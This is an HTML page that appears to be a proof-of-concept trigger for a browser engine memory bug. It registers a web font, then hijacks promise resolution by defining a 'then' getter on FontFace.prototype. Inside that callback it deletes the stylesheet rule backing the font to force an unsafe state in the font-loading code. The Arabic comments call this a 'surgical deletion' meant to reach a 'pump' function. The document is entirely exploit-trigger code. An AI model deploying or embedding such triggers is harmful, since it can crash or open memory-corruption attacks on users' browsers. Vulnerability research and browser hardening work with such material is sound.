<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url(https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Me5WZK.woff2); unicode-range: U+0041; }
    </style>
</head>
<body>
    <div id="debug" style="color: #0f0; font-family: monospace;">Initiating...</div>

    <script>
        const debug = document.getElementById('debug');
        
        function test() {
            debug.innerText = "Triggering...";
            
            let A = new FontFace('x', 'url(https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Me5WZK.woff2)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);

            // اعتراض الـ Promise الخاص بـ FontFace
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    debug.innerText = "Callback reached!";
                    // الحذف الجراحي
                    document.getElementById('s').sheet.deleteRule(0);
                    return undefined;
                }
            });
            
            // تحميل الخط لفرض الدخول في دالة pump
            A.load().then(() => { debug.innerText = "Done!"; }).catch(() => { debug.innerText = "Error caught!"; });
        }

        setTimeout(test, 1000);
    </script>
</body>
</html>
